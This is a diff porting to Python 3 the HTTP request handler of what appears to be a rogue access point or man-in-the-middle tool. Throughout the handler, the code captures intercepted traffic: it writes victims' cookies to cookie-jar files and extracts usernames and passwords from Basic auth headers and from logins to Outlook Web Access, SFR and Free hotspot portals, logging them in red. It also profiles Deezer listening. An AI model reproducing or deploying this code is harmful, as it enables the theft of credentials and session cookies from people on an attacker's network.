@@ -1,16 +1,16 @@
 from threading import Lock,Thread
-from user_agents import parse as ua_parse
-import BaseHTTPServer
-from SocketServer import ThreadingMixIn, TCPServer, BaseRequestHandler
+#from user_agents import parse as ua_parse
+import http.server
+from socketserver import ThreadingMixIn, TCPServer, BaseRequestHandler
 import os
 import ssl
 import base64
 import json
 import time
-import Cookie,cookielib
-import urllib2
+import http.cookies,http.cookiejar
+import urllib.request, urllib.error, urllib.parse
 
-from Utils import *
+from .Utils import *
 
 
 
@@ -49,7 +49,7 @@ class SSLWebserver(Webserver):
     httpd.serve_forever()
     self.app.log("[%s] HTTPS server on port %d is shutting down"%(ctxt("x",RED),self.port))
 
-class HTTPServer(ThreadingMixIn, BaseHTTPServer.HTTPServer):
+class HTTPServer(ThreadingMixIn, http.server.HTTPServer):
   allow_reuse_address = True
   daemon_threads = True
   
@@ -62,13 +62,13 @@ class HTTPServer(ThreadingMixIn, BaseHTTPServer.HTTPServer):
       #client.ssl_traffic_error()
   
   def __init__(self, server_address, app, RequestHandlerClass, bind_and_activate=True, www = 'www'):
-    BaseHTTPServer.HTTPServer.__init__(self, server_address, RequestHandlerClass, bind_and_activate)
+    http.server.HTTPServer.__init__(self, server_address, RequestHandlerClass, bind_and_activate)
     self.app = app
     self.PRE = ''
     self.www_directory = www
     self.logfile = None
 
-class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
+class HTTPRequestHandler(http.server.BaseHTTPRequestHandler):
   
   
   def log_message(self, format, *args):
@@ -89,7 +89,7 @@ class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
   
   def headers_to_text(self):
     return '\n'.join([
-        "%s:%s"%(k,self.headers[k]) for k in self.headers.keys()
+        "%s:%s"%(k,self.headers[k]) for k in list(self.headers.keys())
       ])
 
   def _get_file(self, path):
@@ -112,7 +112,7 @@ class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
   
   def do_GET(self):
     ip = self.client_address[0]
-    print "GET"
+    print("GET")
     client = self.server.app.get_client_from_ip(ip)
     # do not fake unknown clients
     if client is None:
@@ -165,10 +165,10 @@ class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
 
     user_agent_infos = None
     if self.headers.get('user-agent') is not None:
-        print self.headers.get('user-agent')
+        print(self.headers.get('user-agent'))
         ua_string = self.headers['user-agent']
         # parse UA using lib, store device intel and browser intel
-        user_agent_infos = ua_parse(ua_string)
+        #user_agent_infos = ua_parse(ua_string)
     http_auth = self.headers.get('Authorization')
     if http_auth is not None:
       haparams = http_auth.split(' ')
@@ -190,13 +190,13 @@ class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
         ckdata = self.headers['Cookie']
         
         # use a Cookie.SimpleCookie to deserialize data
-        ck = Cookie.SimpleCookie()
+        ck = http.cookies.SimpleCookie()
         ck.load(ckdata)
         # create a cookie jar to export data
         name = os.path.join(self.server.app.logpath, '%s_%s.cookie.txt'%(client.bssid,host))
-        cjar = cookielib.MozillaCookieJar(name)
-        for k,v in ck.items():
-          cjar.set_cookie(cookielib.Cookie(1,
+        cjar = http.cookiejar.MozillaCookieJar(name)
+        for k,v in list(ck.items()):
+          cjar.set_cookie(http.cookiejar.Cookie(1,
             k, v.value, '80', '80',
             host, None, None, 
             '/', None, 
@@ -372,7 +372,7 @@ class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
 
         faked = False
     except Exception as e:
-      print e
+      print(e)
     uri = "%s://%s"%(self.server.PRE.lower(),fullpath)
     client.register_service_request(self.server.PRE, 'GET', uri, '', self.headers_to_text(), False)
 
@@ -407,11 +407,11 @@ class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
           user = {'uri':fullpath,'login': login,  'password':password}
           c.log_login(user)
     except Exception as e:
-      print e
+      print(e)
     
     # get content
     post = ''
-    if self.headers.has_key('Content-Length'):
+    if 'Content-Length' in self.headers:
       length = int(self.headers['Content-Length'])
       post = self.rfile.read(length)
 
@@ -426,7 +426,7 @@ class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
       elif path == 'owa/auth.owa':
         
         try:
-          kvs = dict([ kv.split('=') for kv in urllib2.unquote(post).split('&')])
+          kvs = dict([ kv.split('=') for kv in urllib.parse.unquote(post).split('&')])
           self.server.app.log( "%s login is %s"%(fullpath, 
             ctxt("%s:%s"%(kvs['username'], kvs['password']),RED)) )
           user = {'uri':fullpath,'login': kvs['username'],  'password':kvs['password']}
@@ -434,13 +434,13 @@ class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
         except:
           raise
       elif host == 'hotspot.wifi.sfr.fr':
-        kvs = dict([ kv.split('=') for kv in urllib2.unquote(post).split('&')])
+        kvs = dict([ kv.split('=') for kv in urllib.parse.unquote(post).split('&')])
         self.server.app.log( "%s login is %s"%(fullpath, 
             ctxt("%s:%s"%(kvs['username'], kvs['password']),RED)) )
         user = {'uri':fullpath,'login': kvs['username'],  'password':kvs['password']}
         client.log_login(user)
       elif host == 'wifi.free.fr':
-        kvs = dict([ kv.split('=') for kv in urllib2.unquote(post).split('&')])
+        kvs = dict([ kv.split('=') for kv in urllib.parse.unquote(post).split('&')])
         self.server.app.log( "%s login is %s"%(fullpath, 
             ctxt("%s:%s"%(kvs['login'], kvs['password']),RED)) )
         user = {'uri':fullpath,'login': kvs['login'],  'password':kvs['password']}
@@ -477,11 +477,11 @@ class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
       'song':{},
       'user':{}
     }
-    if data.has_key('params'):
+    if 'params' in data:
       if data['params']['media']['type'] == 'song':
         uri ='%s%s'%(track_uri,data['params']['media']['id'])
         try:
-          response = urllib2.urlopen(uri)
+          response = urllib.request.urlopen(uri)
           html = response.read()
           res = re.findall('<meta property="og:image" content="(.*)">',html)
           thumbnail = res[0]
@@ -497,10 +497,10 @@ class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
         except:
           pass
 
-      if data['params'].has_key('ctxt'):
+      if 'ctxt' in data['params']:
         if data['params']['ctxt']['t'] == 'playlist_page':
           try:
-            response = urllib2.urlopen('%s%s'%(playlist_uri,data['params']['ctxt']['id']))
+            response = urllib.request.urlopen('%s%s'%(playlist_uri,data['params']['ctxt']['id']))
             html = response.read()
             res = re.findall('<a\shref="/profile/(\d+)".*>(.*)</a>',html)
             deezer_data['user'] = {
